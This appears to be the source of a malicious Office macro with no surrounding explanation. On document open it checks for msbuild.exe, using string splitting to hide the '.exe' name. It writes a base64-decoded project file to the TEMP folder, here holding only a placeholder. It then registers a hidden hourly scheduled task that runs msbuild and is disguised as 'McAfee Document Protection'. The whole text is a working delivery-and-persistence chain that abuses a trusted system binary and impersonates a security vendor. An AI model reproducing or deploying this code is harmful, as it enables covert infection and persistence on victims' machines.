Private Sub Document_Open()
  Dim msbPath As String
  msbPath = Environ("windir") & "\Microsoft.NET\Framework64\v4.0.30319\msbuild" & ".e" & "x" & "E"

  If (Len(Dir(msbPath)) = 0) Then
    MsgBox "System requirements not satisfied"
  Else
    Foo (msbPath)
  End If

End Sub

Private Function decodeBase64(ByVal strData As String) As Byte()
    Dim objXML As MSXML2.DOMDocument
    Dim objNode As MSXML2.IXMLDOMElement
   
    Set objXML = New MSXML2.DOMDocument
    Set objNode = objXML.createElement("b64")
    objNode.dataType = "bin.base64"
    objNode.Text = strData
    decodeBase64 = objNode.nodeTypedValue
   
    Set objNode = Nothing
    Set objXML = Nothing
End Function

Private Sub Foo(msbPath As String)
  myFile = Environ("TEMP") & "\sales.msproj"
  Open myFile For Output As #1
  Print #1, decodeBase64("aABlAGwAbABvAC0AdgBiAGEA")
  Close #1

  Bar (msbPath)
End Sub

Private Sub Bar(msbPath As String)
  Const TriggerTypeTime = 1
  Const TASK_ACTION_EXEC = 0
  Const TASK_CREATE_OR_UPDATE = 6
  Const TASK_LOGON_S4U = 2

  Set service = CreateObject("Schedule.Service")
  Call service.Connect

  Dim rootFolder
  Set rootFolder = service.GetFolder("\")

  Dim taskDefinition
  Set taskDefinition = service.NewTask(0)

  Dim regInfo
  Set regInfo = taskDefinition.RegistrationInfo
  regInfo.Author = "McAfee Corporation"
  regInfo.Date = "2017-12-11T13:21:17-01:00"

  Dim settings
  Set settings = taskDefinition.settings
  settings.Enabled = True
  settings.StartWhenAvailable = True
  settings.Hidden = True

  Dim triggers
  Set triggers = taskDefinition.triggers

  Dim trigger
  Set trigger = triggers.Create(TriggerTypeTime)
  trigger.Enabled = True
  trigger.StartBoundary = "2017-12-11T13:21:17-01:00"
  trigger.Repetition.Interval = "PT60M"

  Dim Action
  Set Action = taskDefinition.Actions.Create(TASK_ACTION_EXEC)
  Action.Path = msbPath
  Action.Arguments = "25804802-f420-498c-a61e-b0612c8e735d"
  Action.WorkingDirectory = Environ("TEMP")

  Call rootFolder.RegisterTaskDefinition("McAfee Document Protection", taskDefinition, TASK_CREATE_OR_UPDATE, , , TASK_LOGON_S4U)
End Sub
